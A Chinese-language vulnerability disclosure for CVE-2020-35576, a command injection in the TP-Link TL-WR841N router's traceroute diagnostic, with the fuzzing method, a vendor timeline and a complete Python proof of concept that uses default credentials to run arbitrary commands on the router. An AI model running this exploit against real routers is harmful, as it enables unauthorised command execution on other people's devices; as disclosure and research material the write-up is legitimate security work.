<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<p>Tp-link TL-WR841N是中国普联（Tp-link）公司的一款无线路由器。 TP-Link TL-WR841N 存在参数注入漏洞，该漏洞允许远程经过身份验证的恶意用户在系统上执行任意命令，攻击者可以利用这个漏洞在系统上执行任意命令。</p>
<h3 data-content="1" id="422a7723cb744b2173c36431df5a8de9">受影响的固件</h3>
<p>TL-WR841N(JP)_V13_161028<br/>
&lt;=0.9.1 4.0 v0188.0 Build 161028 Rel.66845n (latest at time of report)</p>
<p>CVSS 分数:7.2</p>
<h3 data-content="1" id="5f024ad98752a32f92b4d90284593fd7">从流量中发现BUG</h3>
<p>路由器提供许多系统诊断工具，包括Ping和Traceroute，用户可以输入指令在路由器系统上执行这些命令。从经验来看，Webcams和Smart Speakers这类IoT设备都存在因为系统诊断工具存在而导致的高危漏洞，所以尝试从客户端和路由器交互过程分析是否存在可能的安全漏洞。</p>
<p>客户通过浏览前使用路由器的Tarceroute功能时候会发送如下请求：</p>
<pre><code>[TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,8
maxHopCount=20
timeout=50
numberOfTries=1
host=127.0.0.1
dataBlockSize=64
X_TP_ConnName=ewan_ipoe_d
diagnosticsState=Requested
X_TP_HopSeq=0</code></pre>
<p>如果执行成功返回[error]0，如果失败范围一个非0数值。</p>
<p>跟踪请求，客户端浏览器会先发送如下请求初始化Traceroute功能：</p>
<pre><code>[ACT_OP_TRACERT#0,0,0,0,0,0#0,0,0,0,0,0]0,0</code></pre>
<p>同样，如果路由器没有出错会返回[error]0，然后客户端浏览器会继续发送如下请求：</p>
<pre><code>[TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,3
diagnosticsState
X_TP_HopSeq
X_TP_Result</code></pre>
<p>然后路由器响应：</p>
<pre><code>[0,0,0,0,0,0]0
diagnosticsState=Requested
X_TP_HopSeq=0
X_TP_Result={results}
[error]0</code></pre>
<p>所有这些请求都是客户端发起，总共有三个，也就是说在Traceroute调用期间浏览器发送的三个请求数据包都是用户可控的。</p>
<p>由于在不逆向固件的条件下无法知道后台的工作逻辑，采用Fuzzer技术对输入点进行测试，看以下哪些字符会被过滤：</p>
<pre><code>|  ; &amp; $ &gt; &lt; ` \ !</code></pre>
<p>测试的时候可以猜测后台的运行逻辑，比如这里假设是system("command")的情况。在测试不同参数的注入点的时候，需要使用单引号或者双引号闭合system的参数，然后注入攻击者的测试Payload。最终在第一个请求的host参数发现命里注入问题，如下：</p>
<pre><code>"`payload</code></pre>
<p>接下来就是考虑如何利用这个漏洞。</p>
<h3 data-content="1" id="1dbd24ee2c2b9b5d71d7c43c777c6c96">利用</h3>
<p>下面给出完整的利用POC，这个POC可以在默认配置下对漏洞版本的TP-LINK进行攻击，从而执行任意系统命令。特别注意如果在测试自己的路由器的时候执行了rm -ef命令，那么路由器可能会永久坏掉，重置都没办法恢复。</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">_</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s1">' '</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">:])</span>
<span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s2">"[*] Command not specified, using the default `cat etc/passwd`"</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="s1">'cat etc/passwd'</span>

<span class="c1"># Default credentials is admin:admin - replace with your own</span>
<span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">'Authorization'</span><span class="p">:</span> <span class="s1">'Basic YWRtaW46YWRtaW4='</span>
<span class="p">}</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">'Host'</span><span class="p">:</span> <span class="s1">'192.168.0.1'</span><span class="p">,</span>
    <span class="s1">'User-Agent'</span><span class="p">:</span> <span class="s1">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0'</span><span class="p">,</span>
    <span class="s1">'Accept'</span><span class="p">:</span> <span class="s1">'*/*'</span><span class="p">,</span>
    <span class="s1">'Accept-Language'</span><span class="p">:</span> <span class="s1">'en-US,en;q=0.5'</span><span class="p">,</span>
    <span class="s1">'Accept-Encoding'</span><span class="p">:</span> <span class="s1">'gzip, deflate'</span><span class="p">,</span>
    <span class="s1">'Content-Type'</span><span class="p">:</span> <span class="s1">'text/plain'</span><span class="p">,</span>
    <span class="s1">'Content-Length'</span><span class="p">:</span> <span class="s1">'197'</span><span class="p">,</span>
    <span class="s1">'Origin'</span><span class="p">:</span> <span class="s1">'http://192.168.0.1'</span><span class="p">,</span>
    <span class="s1">'Connection'</span><span class="p">:</span> <span class="s1">'close'</span><span class="p">,</span>
    <span class="s1">'Referer'</span><span class="p">:</span> <span class="s1">'http://192.168.0.1/mainFrame.htm'</span><span class="p">,</span>
<span class="p">}</span>

<span class="n">data1</span> <span class="o">=</span> \
<span class="sd">'''[TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,8\r\nmaxHopCount=20\r\ntimeout=50\r\nnumberOfTries=1\r\nhost="`{}`"\r\ndataBlockSize=64\r\nX_TP_ConnName=ewan_ipoe_d\r\ndiagnosticsState=Requested\r\nX_TP_HopSeq=0\r\n'''</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">response1</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">'http://192.168.0.1/cgi?2'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data1</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s1">'[+] Sending payload...'</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">response1</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
<span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="s1">'[-] Cannot get response. Please check your cookie.'</span><span class="p">)</span>

<span class="k">if</span> <span class="n">response1</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">'[error]0'</span><span class="p">:</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="s1">'[*] Router/Firmware is not vulnerable.'</span><span class="p">)</span>

<span class="n">data2</span> <span class="o">=</span> <span class="s1">'[ACT_OP_TRACERT#0,0,0,0,0,0#0,0,0,0,0,0]0,0</span><span class="se">\r\n</span><span class="s1">'</span>
<span class="n">response2</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">'http://192.168.0.1/cgi?7'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data2</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s1">'[+] Receiving response from router...'</span><span class="p">)</span>
<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.8</span><span class="p">)</span> <span class="c1"># Buffer time for traceroute to succeed</span>

<span class="n">data3</span> <span class="o">=</span> <span class="s1">'''[TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,3</span><span class="se">\r\n</span><span class="s1">diagnosticsState</span><span class="se">\r\n</span><span class="s1">X_TP_HopSeq</span><span class="se">\r\n</span><span class="s1">X_TP_Result</span><span class="se">\r\n</span><span class="s1">'''</span>
<span class="n">response3</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">'http://192.168.0.1/cgi?1'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data3</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>


<span class="k">if</span> <span class="s1">'=:'</span> <span class="ow">in</span> <span class="n">response3</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()[</span><span class="mi">3</span><span class="p">]:</span>
    <span class="k">print</span><span class="p">(</span><span class="s1">'[-] Command not supported.'</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s1">'[+] Exploit successful!'</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">line_number</span><span class="p">,</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">response3</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()):</span>        
        <span class="k">try</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">line_number</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="n">line</span><span class="p">[</span><span class="mi">12</span><span class="p">:])</span>
            <span class="k">if</span> <span class="n">line_number</span> <span class="o">&gt;</span> <span class="mi">3</span> <span class="ow">and</span> <span class="n">line</span> <span class="o">!=</span> <span class="s1">'[error]0'</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
                <span class="k">if</span> <span class="s1">'not known'</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
                    <span class="k">break</span>
        <span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
            <span class="k">break</span>
</pre></div>
<h3 data-content="1" id="c28829b96f72c0923eb595bfa9355584">漏洞时间线</h3>
<p><strong>2020-12-14 19:27:15 JST</strong> - 报告给Vendor (security@tp-link.com)<br/>
<strong>2020-12-15 18:33:09 JST</strong> - Vendor回应<br/>
<strong>2020-12-15 22:11:31 JST</strong> - CVE申请<br/>
<strong>2020-12-18 20:33:37 JST</strong> - 向Vendor汇报漏洞细节<br/>
<strong>2020-12-20 14:31:57 JST</strong> - 得到CVE-2020-35576编号<br/>
<strong>2020-12-21 12:10:57 JST</strong> - 告诉Vendor漏洞利用方式<br/>
<strong>2020-12-21 14:57:08 JST</strong> - Vendor回应会更新补丁<br/>
<strong>2020-12-31 18:57:06 JST</strong> - Vendor发送一个新的固件版本<br/>
<strong>2021-01-02 11:36:58 JST</strong> - 测试固件版本没有问题并通知Vendor<br/>
<strong>2021-01-13 12:39:06 JST</strong> - Vendor发布新的固件版本</p>
</div>
</div>